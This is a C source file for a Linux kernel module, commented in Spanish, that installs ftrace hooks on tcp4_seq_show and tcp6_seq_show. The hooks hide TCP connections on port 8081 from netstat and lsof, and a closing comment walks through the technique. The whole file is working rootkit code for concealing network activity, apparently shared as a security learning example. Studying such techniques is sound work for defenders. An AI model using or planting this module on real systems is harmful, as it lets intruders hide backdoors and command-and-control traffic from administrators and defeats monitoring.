#include <linux/init.h>        // Macros para la inicialización y finalización del módulo
#include <linux/module.h>      // Funciones para cargar y descargar módulos (module_init, module_exit)
#include <linux/kernel.h>      // Funciones y macros esenciales del kernel, como printk()
#include <linux/syscalls.h>    // Definiciones relacionadas con las llamadas al sistema
#include <linux/tcp.h>         // Estructuras y definiciones para conexiones TCP (struct sock)
#include "ftrace_helper.h"     // Herramientas para instalar y remover hooks con ftrace

#define PORT 8081              // Define el puerto que se desea ocultar

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mtzsec");
MODULE_DESCRIPTION("Hiding connections from netstat and lsof");
MODULE_VERSION("1.0");

// Punteros para almacenar las direcciones originales de las funciones a hookear.
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

/*
 * hooked_tcp4_seq_show:
 *   Esta función se utiliza para interceptar la función original tcp4_seq_show.
 *   Su función es comprobar si la conexión actual corresponde al puerto definido (PORT).
 *   Si es así, se imprime un mensaje de depuración y se retorna 0 para ocultar la conexión;
 *   en caso contrario, se llama a la función original para que la conexión se muestre normalmente.
 */
static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v; // Interpreta el argumento como un puntero a la estructura "struct sock"

    // Comprueba si la conexión es válida y si el puerto coincide con PORT.
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT) {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;  // Oculta la conexión al no permitir que se muestre su información.
    }
    // Si no coincide, llama a la función original para procesar la conexión normalmente.
    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

/*
 * hooked_tcp6_seq_show:
 *   Funciona de forma similar a hooked_tcp4_seq_show pero para conexiones IPv6.
 */
static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT) {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }
    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}

/*
 * Definición de los hooks utilizando la infraestructura de ftrace.
 * La macro HOOK (definida en ftrace_helper.h) configura cada hook para redirigir
 * la ejecución de las funciones originales a nuestras funciones hook.
 */
static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};

/*
 * Función de inicialización del módulo.
 * Se ejecuta al cargar el módulo (por ejemplo, con "insmod netstat.ko").
 * Llama a fh_install_hooks() para instalar los hooks y modificar el comportamiento
 * de las funciones encargadas de listar conexiones TCP.
 */
static int __init hideport_init(void)
{
    int err;
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if (err)
        return err;
    return 0;
}

/*
 * Función de finalización del módulo.
 * Se ejecuta al descargar el módulo (por ejemplo, con "rmmod netstat.ko").
 * Llama a fh_remove_hooks() para eliminar los hooks y restaurar el comportamiento normal.
 */
static void __exit hideport_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

module_init(hideport_init);
module_exit(hideport_exit);





/*
 * ================================================================
 *              PROCESO PRÁCTICO DEL HOOKING CON FTRACE
 * ================================================================
 *
 * Carga del módulo:
 *   Cuando cargas el módulo del kernel (por ejemplo, usando "insmod netstat.ko"),
 *   se ejecuta la función de inicialización del módulo (hideport_init). En esta función
 *   se llama a fh_install_hooks() para instalar los hooks utilizando la infraestructura
 *   de ftrace. Los hooks se configuran para interceptar las funciones "tcp4_seq_show"
 *   y "tcp6_seq_show", que son responsables de listar las conexiones TCP en IPv4 e IPv6.
 *
 * Ejecución del sistema:
 *   Imagina que el sistema intenta mostrar las conexiones TCP (por ejemplo, mediante el
 *   comando "netstat"). Durante este proceso, se invocan las funciones "tcp4_seq_show" o
 *   "tcp6_seq_show" para listar las conexiones activas.
 *
 * Intercepción por los hooks de ftrace:
 *   Gracias a la instalación de los hooks, cuando se invoca una de estas funciones,
 *   la ejecución se redirige a nuestras funciones hook (hooked_tcp4_seq_show y
 *   hooked_tcp6_seq_show) en lugar de la función original.
 *
 * Acción del hook:
 *   En las funciones hook se verifica el puerto asociado a cada conexión (almacenado en
 *   el campo sk_num de la estructura "struct sock"). Si el puerto coincide con el valor
 *   definido (8081), la función hook retorna 0, lo que impide que se muestre la información
 *   de esa conexión en la salida de "netstat" o "lsof". Si el puerto no coincide, se llama a
 *   la función original para que la conexión se muestre normalmente.
 *
 * Resultado:
 *   Las conexiones que se realizan en el puerto 8081 quedan ocultas en la salida de herramientas
 *   de monitoreo de red, permitiendo ocultar actividades específicas en el sistema.
 *
 * Descarga del módulo:
 *   Cuando ya no necesites el módulo, puedes descargarlo con "rmmod netstat.ko". En ese momento,
 *   se llama a la función de finalización (hideport_exit), que desinstala los hooks mediante
 *   fh_remove_hooks(), restaurando el comportamiento normal del kernel.
 *
 * En resumen, el proceso práctico del hooking con ftrace en este ejemplo es:
 *
 *   - Registro: Se instalan hooks sobre las funciones "tcp4_seq_show" y "tcp6_seq_show".
 *   - Intercepción: Cada vez que se intenta listar las conexiones TCP, la ejecución se redirige
 *     a nuestras funciones hook.
 *   - Modificación: Las funciones hook verifican el puerto de cada conexión y, si es 8081, ocultan
 *     la conexión impidiendo su visualización.
 *   - Restauración: Al descargar el módulo, se eliminan los hooks y se restaura el comportamiento
 *     original del sistema.
 *
 * ================================================================
 */